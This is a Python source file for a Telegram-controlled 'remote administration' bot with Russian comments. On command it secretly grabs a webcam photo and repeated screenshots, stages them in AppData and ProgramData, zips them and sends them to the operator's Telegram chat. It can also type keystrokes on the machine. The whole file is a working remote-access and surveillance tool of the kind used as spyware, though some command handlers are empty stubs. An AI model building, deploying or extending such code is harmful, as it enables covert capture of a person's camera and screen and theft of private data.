# Подключаем модули
import telebot  # Библиотека для бота
import config  # конфиг
# import json  # библиотека для работы с форматом json
from time import sleep
# функция для временного приостанавливания работы программы
import pyautogui as pag  # библиотека для управления клавиатурой и мышью
# from telebot import types  # Импортируем типы из модуля, чтобы создавать кнопки
import os
import zipfile
from PIL import ImageGrab
import cv2
from data import data as data

# global variables
debug = True

if debug:
    print('Подключил библиотеки успешно')
while True:
    try:
        language_code = ''

        # Указываем токен

        bot = telebot.TeleBot(config.token)

        if debug:
            print('Подключился к северам телеграмм успешно')


        def help(user_id):
            if debug:
                print('/help')
            for i in data['messages'][language_code]['help']:
                bot.send_message(user_id, i)
                sleep(1)


        def photo(user_id):
            def photomake():
                # Включаем первую камеру
                cap = cv2.VideoCapture(0)

                # "Прогреваем" камеру, чтобы снимок не был тёмным
                # for i in range(30):
                #     cap.read()

                # Делаем снимок
                do_photo, photo = cap.read()

                # Отключаем камеру
                cap.release()

                return do_photo, photo

            if debug:
                print('/photo')
            bot.send_message(user_id, 'Выполняю')
            ret, frame = photomake()
            if ret:
                cv2.imwrite((os.getenv("APPDATA") + '\\photos' + '.jpg'), frame)
            zname = r'C:\ProgramData\Photos.zip'
            newzip = zipfile.ZipFile(zname, 'w')
            newzip.write(r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\photos' + '.jpg')
            newzip.close()
            doc = open(zname, 'rb')
            bot.send_document(user_id, doc)
            doc.close()


        def screenshot(user_id, count=5, sec=3):
            def screenshotmake(count, time):
                for i in range(count):
                    screen = ImageGrab.grab()
                    screen.save(os.getenv("APPDATA") + '\\screenshot' + str(i) + '.jpg')
                    sleep(time)
                arch_name = r'C:\ProgramData\Screenshots.zip'
                archive = zipfile.ZipFile(arch_name, 'w')
                for i in range(count):
                    archive.write(r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\screenshot' + str(i) + '.jpg')
                archive.close()
                return r'C:\ProgramData\Screenshots.zip'

            if debug:
                print('/screenshot')
            bot.send_message(user_id, 'Выполняю')
            doc = open(screenshotmake(count, sec), 'rb')
            bot.send_document(user_id, doc)
            doc.close()


        def writetext(user_id, text):
            if debug:
                print('/writetext')
            pag.typewrite(text)


        def click(user_id, cords):
            if debug:
                print('/click')


        def comb(user_id, key1, key2):
            if debug:
                print('/comb')


        def aboutme(user_id):
            if debug:
                print('/aboutme')


        if debug:
            print('Жду сообщения')


        # Метод, который получает сообщения и обрабатывает их
        @bot.message_handler(content_types=['text'])
        def get_text_messages(message):
            global language_code
            # print(message)
            language_code = 'ru'  # message.from_user.language_code  # ["from_user"]['language_code']
            print(language_code)
            if debug:
                print('Пришло сообщение', message)
            # Если написали «Привет»
            if message.from_user.id in config.chat_id:

                if message.json['entities'][0]['type'] == "bot_command":
                    # print(metods)
                    if message.text.split()[0] == '/start':
                        bot.send_message(message.from_user.id,
                                         "Приветствуем вас в программе удаленного администрирования, чтобы получить "
                                         "список команд напишите /help")
                    elif message.text.split()[0] == '/help':
                        help(message.from_user.id)
                    elif message.text.split()[0] == '/screenshot':
                        # try:
                        #     screenshot(message.from_user.id, int(message.text.split[1]), int(message.text.split[2]))
                        # except IndexError:
                        #     screenshot(message.from_user.id)
                        # except Exception as e:
                        #     print(e)
                        screenshot(message.from_user.id)
                    elif message.text.split()[0] == '/photo':
                        photo(message.from_user.id)
                        # for i in metods:
                        #     print(metods[i])
                        #     print(mesdata.text)#.split)
                        #     print(mesdata.text.split()[0])
                        #     if mesdata.text.split()[0] == metods[i]:
                        #         print()
                        #     if mesdata.text.split()[0] == '/screenshot':
                        #         try:
                        #             screenshot(
                        #             mesdata.from_user.id,
                        #             int(mesdata.text.split[1]),
                        #             int(mesdata.text.split[2]))
                        #         except IndexError:
                        #             screenshot(mesdata.from_user.id)
                        # if mesdata.text == metods[i]['command']:
                        # print(f'Введена команда {metods[i]["command"]}')

                        # bot.send_message(id, messages[language_code])
                else:
                    bot.send_message(id, "К сожалению пока я умею работать только с командами")


        # Запускаем постоянный опрос бота в Телеграме
        bot.polling(none_stop=True, interval=0)

    except Exception as e:
        print(e)
        try:
            for user in config.chat_id:
                bot.send_message(user, f'Произошла ошибка')
                bot.send_message(user, e)
        except:
            pass
